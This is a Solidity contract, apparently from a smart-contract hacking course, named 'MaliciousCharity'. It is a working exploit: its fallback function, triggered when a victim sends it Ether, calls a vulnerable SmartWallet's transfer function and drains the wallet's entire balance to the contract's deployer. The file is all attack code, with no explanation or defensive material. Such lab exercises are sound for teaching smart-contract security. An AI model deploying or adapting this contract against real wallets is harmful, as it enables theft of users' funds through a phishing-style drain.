// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policyGPL-3.0-or-later
pragma solidity ^0.8.13;

interface ISmartWallet {
    function transfer(address payable _to, uint _amount) external;
}

/**
 * @title MaliciousCharity
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract MaliciousCharity {

    address payable private owner;
    ISmartWallet private wallet;

    constructor(address _vulnerableWallet) {
        owner = payable(msg.sender);
        wallet = ISmartWallet(_vulnerableWallet);
    }

    fallback() external payable {
        wallet.transfer(owner, address(wallet).balance);
    }
}